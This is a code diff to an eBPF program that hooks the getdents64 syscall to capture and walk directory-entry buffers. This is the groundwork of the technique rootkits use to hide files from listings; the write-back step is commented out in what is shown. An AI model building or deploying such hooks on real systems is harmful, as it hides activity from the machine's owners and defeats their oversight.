@@ -1,9 +1,10 @@
 #pragma once
 
 #include "vmlinux.h"
+// Must be included first
 
-#include "utils/is_target.h"
-#include "utils/write_user.h"
+#include <bpf/bpf_helpers.h>
+#include <bpf/bpf_tracing.h>
 
 struct {
   __uint(type, BPF_MAP_TYPE_HASH);
@@ -14,7 +15,6 @@ struct {
 
 SEC("tracepoint/syscalls/sys_enter_getdents64")
 int enter_getdents64(struct trace_event_raw_sys_enter *ctx) {
-  if (!is_target_proc()) return 0;
   tid_t tid = bpf_get_current_pid_tgid();
 
   struct linux_dirent64 *d_entry = (struct linux_dirent64 *)ctx->args[1];
@@ -35,7 +35,7 @@ int exit_getdents64(struct trace_event_raw_sys_exit *ctx) {
 
   bpf_map_delete_elem(&dir_entries, &tid);
 
-//  return write_user(*dir_addr);
+  //  return write_user(*dir_addr);
 
   long offset = 0;
   // limitation for now, only examine the first 256 entries
